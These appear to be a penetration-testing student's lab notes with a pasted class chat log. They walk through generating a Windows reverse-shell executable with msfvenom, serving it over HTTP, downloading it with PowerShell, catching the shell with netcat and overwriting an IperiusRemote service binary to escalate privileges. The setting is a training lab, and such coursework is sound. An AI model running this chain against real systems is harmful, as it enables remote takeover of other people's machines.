# Day 10

## The Heist

### MSFVenom
```Bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.50.138.46 LPORT=4444 -f exe -o heist.exe
```

Creates the file that you want on the target. Just need to get it there! Ideally to be ran as admin
- wget
- cerutil
- vbscript
- rdesktop and download

MSF Venom Cheat Sheets
- https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
- https://github.com/frizb/MSF-Venom-Cheatsheet
- https://medium.com/@c.andrewlong/msfvenom-cheatsheet-f9e43edae9f1
- https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
- https://netsec.ws/?p=331
- https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
- https://www.hacknos.com/msfvenom-payload-cheat-sheet/
- https://blog.certcube.com/oscp-msfvenom-all-in-one-cheatsheet/
- https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
- https://blog.extremehacking.org/blog/2017/06/29/msfvenom-cheat-sheet/

Make it available on your host as a webserver so we can transfer it to the target

```Bash
python3 -m http.server 80
```

And then on the target
```Bash
# No need to specify the port becase we opened the server on port 80

# Ensure you run this from a user writeable folder so we can write the outfile. 

powershell -c "Invoke-WebRequest -Uri '<Attacker IP>/heist.exe' -OutFile heist.exe"```

Begin listening

```Bash
nc -lvnp -4444
```

On the target, copy the heist.exe file over the Iperius file. 


Moving on...

Winpeas
- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

19:52:01 From  Brett Gustafson  to  Everyone:
	What's the benefit to a staged shell?
19:52:03 From  Matt  to  Everyone:
	are we going to cover encoding payloads with msfvenom
19:54:11 From  Candido Lopez - Evolve Academy  to  Everyone:
	As we do more boxes it will come up but by default msfvenom does encode with shikata ga nails automatically
19:54:40 From  Candido Lopez - Evolve Academy  to  Everyone:
	nai not nails
19:55:15 From  Matt  to  Everyone:
	did that change, I swear a few years ago I had to manually specifiy shikata encoding
19:55:25 From  Candido Lopez - Evolve Academy  to  Everyone:
	It did
19:55:37 From  Candido Lopez - Evolve Academy  to  Everyone:
	Last year
19:57:22 From  Matt  to  Everyone:
	ah ok
19:57:56 From  Candido Lopez - Evolve Academy  to  Everyone:
	Late last year actually if I remember correctly.  This came up in the last cohort.
20:03:55 From  Nic George - Evolve Academy  to  Everyone:
	I just double checked and it only uses shikata ga nai by default when specifying the -b flag
20:03:58 From  Q  to  Everyone:
	msfvenom -p windows/shell_reverse_tcp LHOST=10.50.138.46 LPORT=4444 -f exe -o heist.exe
20:04:02 From  tchitchu  to  Everyone:
	is this how the .jpg executables are created?
20:05:02 From  Adam  to  Everyone:
	Is the steganographic option in MSFVenom
20:05:04 From  Adam  to  Everyone:
	?
20:05:13 From  Adam  to  Everyone:
	Is there a*
20:07:28 From  Q  to  Everyone:
	msfvenom -p windows/shell_reverse_tcp LHOST=10.50.138.46 LPORT=4444 -f exe -o heist.exe
20:10:46 From  Candido Lopez - Evolve Academy  to  Everyone:
	List of Cheatsheets for MSFVenom
20:10:49 From  Candido Lopez - Evolve Academy  to  Everyone:
	https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
	https://github.com/frizb/MSF-Venom-Cheatsheet
	https://medium.com/@c.andrewlong/msfvenom-cheatsheet-f9e43edae9f1
	https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
	https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
	https://netsec.ws/?p=331
	https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
	https://www.hacknos.com/msfvenom-payload-cheat-sheet/
	https://blog.certcube.com/oscp-msfvenom-all-in-one-cheatsheet/
	https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
	https://blog.extremehacking.org/blog/2017/06/29/msfvenom-cheat-sheet/
20:13:00 From  Q  to  Everyone:
	powershell -c "Get-Help process"
20:14:19 From  Q  to  Everyone:
	python3 -m http.server 80
20:16:16 From  Q  to  Everyone:
	powershell -c "Invoke-WebRequest -Uri 'http://10.50.138.46/heist.exe' -OutFile heist.exe
20:27:13 From  Q  to  Everyone:
	copy C:\Users\professor\heist.exe C:\ProgramData\IperiusRemote\IperiusRemoteSystem.exe
20:28:14 From  Q  to  Everyone:
	powershell -c "Invoke-WebRequest -Uri 'http://10.50.138.46/heist.exe' -OutFile heist.exe"
20:28:29 From  Q  to  Everyone:
	copy C:\Users\professor\heist.exe C:\ProgramData\IperiusRemote\IperiusRemoteSystem.exe
20:30:36 From  Candido Lopez - Evolve Academy  to  Everyone:
	https://github.com/mttaggart/OffensiveNotion
20:31:30 From  Nic George - Evolve Academy  to  Everyone:
	shutdown /r /t 0 /f
20:35:03 From  J Mo  to  Everyone:
	insecure service path folder permissions
20:37:50 From  Q  to  Everyone:
	https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
20:38:05 From  Matt  to  Everyone:
	also, if you reset it it wipes it back to original, so what you uploaded would be gone
20:38:26 From  Matt  to  Everyone:
	so you'd want to restart it inside of the VM, not reset the VM it's self
20:38:27 From  Candido Lopez - Evolve Academy  to  Everyone:
	+1
20:38:47 From  Brett Gustafson  to  Everyone:
	What's the reset quota for OSCP?
20:39:21 From  Candido Lopez - Evolve Academy  to  Everyone:
	25
20:39:32 From  Candido Lopez - Evolve Academy  to  Everyone:
	More if you ask nicely
20:39:35 From  Candido Lopez - Evolve Academy  to  Everyone:
	Not a joke
20:40:16 From  Candido Lopez - Evolve Academy  to  Everyone:
	You should not need to reset that many times though
20:45:05 From  Q  to  Everyone:
	https://gtfobins.github.io/
20:59:13 From  Matt  to  Everyone:
	show me your WARshell
20:59:17 From  Matt  to  Everyone:
	RAAAAAAH
